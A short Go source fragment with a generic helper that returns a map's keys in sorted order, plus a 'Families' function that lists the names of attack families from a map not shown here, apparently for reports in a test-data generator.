func keys[T any](m map[string]T) []string {
	var k []string
	for x := range m {
		k = append(k, x)
	}
	// Sorted, so the same seed always gives the same data.
	for i := 1; i < len(k); i++ {
		for j := i; j > 0 && k[j] < k[j-1]; j-- {
			k[j], k[j-1] = k[j-1], k[j]
		}
	}
	return k
}

// Families lists the attack families (for reports).
func Families() []string { return keys(attacks) }
